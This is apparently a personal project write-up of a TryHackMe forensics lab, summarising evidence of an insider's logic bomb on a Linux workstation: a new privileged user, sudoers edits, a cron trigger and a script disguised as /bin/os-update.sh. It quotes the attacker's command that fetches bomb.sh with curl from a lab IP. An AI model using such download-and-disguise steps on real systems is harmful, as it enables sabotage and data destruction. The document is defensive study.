# 🧨 Logic Bomb Forensics Investigation (TryHackMe)

This project documents my forensic investigation of a suspicious Linux machine during the **"Logic Bomb"** TryHackMe room scenario. I performed a full analysis of the system using CLI tools to uncover evidence of insider threat activity and a logic bomb set to execute under specific conditions.

---

## 🕵️ Scenario Summary

An employee from CyberT’s IT department was arrested for operating a phishing ring. Our task was to investigate their last workstation for evidence of sabotage or malicious behavior. By analyzing logs and files, we uncovered a logic bomb designed to damage systems if certain triggers were met.

---

## 🔧 Tools & Skills Demonstrated

- **Command-Line Tools:** `journalctl`, `grep`, `cat`, `curl`, `vi`
- **Linux Forensics:** Privilege escalation auditing, script analysis, file metadata
- **Threat Analysis:** Insider threats, logic bomb behavior, malicious automation
- **File & Cron Investigation:** User creation, sudo access modification, scheduled execution

---

## 📂 Key Evidence Recovered

| Action | Details |
|-------|---------|
| 📦 Package Installed | `/usr/bin/apt install dokuwiki` |
| 📁 Working Directory | `/home/cybert` |
| 👤 Suspicious User Created | `it-admin` |
| 🔐 Sudoers Modified | `Dec 28 06:27:34` |
| 📝 Script Created | `bomb.sh` |
| 🌐 Source of Script | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
| 🛠️ Renamed Script | `/bin/os-update.sh` |
| 📅 Modified Timestamp | `Dec 28 06:29` |
| 📄 File Created on Execution | `goodbye.txt` |
| ⏰ Scheduled Trigger | `08:00 AM` (via cron or scheduled task) |

---

## 📖 What I Learned

> This lab taught me how to trace suspicious Linux activity, analyze logs for privilege escalation, and reverse-engineer a logic bomb scenario using basic CLI tools. It sharpened my ability to investigate real-world sabotage tactics and understand how insider threats hide in plain sight.

---

## 💼 How This Applies in the Real World

- Detecting unauthorized user creation
- Tracking privilege escalation in system logs
- Identifying timed execution scripts (logic bombs)
- Recognizing file tampering or covert data destruction attempts

---

## 📎 Related Tags

`#linux-forensics` `#logic-bomb` `#tryhackme` `#malware-analysis` `#insider-threats` `#curl` `#bash-scripting` `#cybersecurity-project`


